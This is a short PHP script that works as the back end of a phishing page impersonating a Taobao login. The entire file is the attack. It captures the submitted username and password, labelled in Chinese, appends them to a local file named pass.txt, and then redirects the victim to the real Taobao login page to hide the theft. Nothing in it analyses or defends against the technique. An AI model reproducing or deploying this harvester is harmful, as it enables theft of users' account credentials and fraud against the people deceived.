<?php
$sniff = "用户名：".$_POST['user']."密码:".$_POST['keyed']."\n";
$key = fopen('pass.txt','a');
fwrite($key, $sniff);
fclose($key);
Header("Location: https://login.taobao.com/member/login.jhtml?from=taobaoindex&style=&sub=true&redirect_url=http%3A%2F%2Fi.taobao.com%2Fmy_taobao.htm%3Fspm%3D1.7274553.1997525045.1.1lD0fW");
?>